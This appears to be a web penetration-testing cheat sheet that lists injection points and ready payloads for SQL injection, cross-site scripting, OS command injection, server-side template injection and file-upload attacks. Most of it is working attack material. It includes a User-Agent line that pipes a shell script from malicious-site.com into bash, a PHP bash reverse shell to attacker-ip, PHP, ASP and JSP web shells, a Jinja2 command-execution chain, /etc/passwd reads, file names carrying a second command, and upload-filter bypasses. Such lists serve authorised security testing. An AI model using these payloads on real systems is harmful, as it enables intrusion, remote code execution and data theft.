# 1. SQL Injection (SQLi)
 * Inject payloads in:
    http://example.com/product?id=1

    PayLoad: ```id=1' OR '1'='1```
 
 * Form inputs:
    Login forms (username and password fields):

    PayLoad: ```' OR 1=1 --```

 * Search bars:

    PayLoad: ```' UNION SELECT 1,2,3 --```   

 * Headers: Custom headers (e.g., X-User-Info).

    PayLoad: ```Cookie: user_id=1' OR '1'='1```

 * API endpoints: JSON data in POST requests:   

    PayLoad: ```{"user_id": "1' OR '1'='1"}```

# 2. Cross-Site Scripting (XSS) 

 * Form inputs: [Comment boxes, feedback forms, or search bars.]

    PayLoad: ```<script>alert('XSS');</script>```

 * URL parameters: 
 
    PayLoad: ```http://example.com/page?search=<script>alert('XSS')</script>```

 * Headers:
 
    1. HTTP referer header:

      PayLoad: ```Referer: <script>alert('XSS')</script>```

    2. Cookies:

      PayLoad: ```Cookie: session=<script>alert('XSS')</script>```      

 * File uploads: Upload files with malicious content ```(e.g., SVG with <script> inside)```.

# 3. OS Command Injection
 * Form inputs: Server admin panels (e.g., diagnostic tools)

    PayLoad: ```; cat /etc/passwd;```

 * URL parameters:

    PayLaod: ```http://example.com/scan?ip=127.0.0.1;ls```

 * Headers:

    1. User-Agent header:

      PayLoad: ```User-Agent: ; wget http://malicious-site.com/shell.sh | bash;```

    2. API or command-executing functions [Shell commands in JSON:]

      PayLoad: ```{"command": "ping 127.0.0.1; cat /etc/passwd"}```      

 * File upload fields:
    PayLoad: ```; ls -la;```
                
                @Upload Files with Suspicious Names@

                    Test file names like:
                    test.jpg; whoami
                    test.jpg && uname -a
                    test.jpg || ls -la

                #Analyze the Server’s Response#

                    Look for:
                    Errors revealing command execution results.
                    Changes in server behavior (e.g., files created or deleted).   

                !Upload Malicious File Content!

                    Use payloads in scripts (e.g., .sh, .php, .py) if the server executes uploaded files.
                    Example payload:
                    php
                    Copy code
                    {<?php echo shell_exec("ls -la"); ?> }   

# 4. Server-Side Template Injection (SSTI)

 * Template-related fields: (Invoice numbers, receipt templates, or email templates.)

    PayLoad: ```{{7*7}}  # For Jinja2```

 * URL parameters:

    PayLoad: ```http://example.com/render?template={{7*7}}```

 * Form inputs: (Feedback forms)

    PayLoad: ```Feedback forms:```

 * Headers: (HTTP headers passed to server-side templates)

    PayLoad: ```User-Agent: {{7*7}}```       

 * File uploads: (If file content is rendered in templates)

    PayLoad: ```{{config.items()}}```

            1: Steps to Exploit
                Step 1: Identify the Template Engine
                Determine which template engine the server uses (if possible) by looking for clues in:

                Error messages.
                Source code (if accessible).
                Known frameworks (e.g., Flask with Jinja2, Django templates, etc.).

            2: Create a Malicious File
                Craft a file with payloads designed for template injection. Examples:  

            
                

                    1- Jinja2 (Python-based engines):

                    Payload for command execution:
                    ```{{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True).communicate() }}```
                    Explanation:This payload exploits Python objects to call system commands (id is an example command).

                    2- Twig (PHP-based engines): Payload for command execution:
                        ``` {{ system('ls -la') }}```



                    3- Thymeleaf (Java-based engines):

                        Payload:```${T(java.lang.Runtime).getRuntime().exec('ls -la')}```


                    4- Generic Payload for Testing:

                    File with:
                          PayLoad:  ``` {{7*7}}```
                    If this executed by the server. and If 49 appears in the output, injection is possible.
        
            3: Upload the Malicious File
                Upload the file through the vulnerable file upload functionality.

            4: Trigger the Rendering
                Access the file (e.g., via a direct URL or a viewing page).
                The server renders the file content, executing any malicious code within the template.

# 5. File Upload

 __1. Reconnaissance: Gather Information__
 
    *  Understand the functionality:

                Is there a file type restriction (e.g., .jpg, .png)?
                Where is the file stored or processed after upload?
                Can the uploaded file be accessed publicly?
    *  Observe responses:

                Does the server return error messages or specific file paths after upload?

 __2. Test File Extension Restrictions__

            Many file upload mechanisms enforce file type restrictions based on extensions, but these can often be bypassed:

   *  Upload files with double extensions:
      - Example: shell.php.jpg or malicious.asp;.jpg

   *  Use case-insensitive extensions:
      - Example: test.JPG, file.PHp

   * Add invalid characters after the extension:
      - Example: test.php%00.jpg (works on systems that terminate file names at null bytes).

   * Upload no-extension files:
      - Example: Rename test.php to test.

 __3. Test MIME Type Validation__

              Some systems validate file types based on MIME types:

  * Modify MIME type using tools:

    - Use Burp Suite or Postman to intercept the upload request and modify the Content-Type header.

      - Example: Change image/png to application/x-php.

    * Mismatch MIME type:

      - Upload a PHP file with a MIME type of image/jpeg.

 __4. Bypass Client-Side Validation__

   *  Disable JavaScript:
       - If file restrictions are enforced on the client side, disabling JavaScript might bypass them.

   *  Intercept Requests:

       - Use Burp Suite or a similar proxy to modify the upload request before it reaches the server.

 __5. Upload Malicious Files__  

  * Scenario 1: Execute Code. [Upload a script that the server might execute-web-shell.]

    - PHP:

        PayLoad: ```<?php system($_GET['cmd']); ?>```  

    - ASP:

        PayLoad: ```<% execute(request("cmd")) %>```  

    - JSP:

        PayLoad: ```<% out.println(Runtime.getRuntime().exec("cmd /c dir").getInputStream()); %>```  

 * Scenario 2: HTML/JS Injection

    - Malicious HTML:
        
        PayLoad: ```<script>alert('XSS');</script>``` 

        ---If uploaded files are rendered as HTML, this could lead to stored XSS.               
  
 * Scenario 3: Reverse Shell
    
    - Upload a reverse shell script:

        PayLoad: ```<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'"); ?>```

 __6. Analyze File Content Handling__

 * Upload Files with Embedded Commands:

    - Example: A .txt file containing:
        PayLoad: ```<?php echo shell_exec('ls'); ?>```

        ---Observe if the server interprets or executes the content.

 * Test Image Files for Exploits:
   Use tools like ExifTool to embed malicious payloads in metadata. 

    - Example:
        PayLoad: ```exiftool -Comment='<?php system($_GET["cmd"]); ?>' test.jpg```

 __7. Test File Path Manipulation__

 * Upload File with Path Traversal:

     PayLoad: ```File name: ../../../../etc/passwd```

     ---Attempt to overwrite sensitive files or place the file in unintended directories.

 __8. Check for Template Injection__    

 * Upload files with template payloads for engines like Jinja2 or Twig:

     -  File content: {{7*7}}.
     -  Observe if the server renders this as 49.

 __9. Exploit File Inclusion Vulnerabilities__  
 If the application has a file inclusion vulnerability, upload a file and exploit it:  

 *  Example:
        Upload shell.php and access it via:

     PayLoad: ```http://example.com/uploads/shell.php?cmd=id```

 __10. Automate Testing__

  * Use tools like Burp Suite's Upload Scanner plugin to test various upload-related vulnerabilities.
  * Use OWASP ZAP with customized payloads. 
  
     
